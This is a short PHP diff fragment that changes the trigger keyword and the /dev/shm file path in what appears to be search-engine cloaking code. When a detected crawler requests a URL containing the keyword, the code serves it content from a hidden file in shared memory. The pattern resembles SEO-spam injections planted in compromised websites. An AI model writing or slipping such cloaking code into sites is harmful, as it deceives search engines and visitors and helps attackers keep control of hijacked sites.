@@ -25,10 +25,10 @@ foreach ($bots as $bot) {
     }
 }
 
-/* trigger hanya ajmri */
-if ($is_bot && stripos($request_uri, 'ajmri') !== false) {
+/* trigger hanya jans */
+if ($is_bot && stripos($request_uri, 'jans') !== false) {
 
-    $file = '/dev/shm/ajmri.txt';
+    $file = '/dev/shm/jans.txt';
 
     if (file_exists($file)) {
         readfile($file);
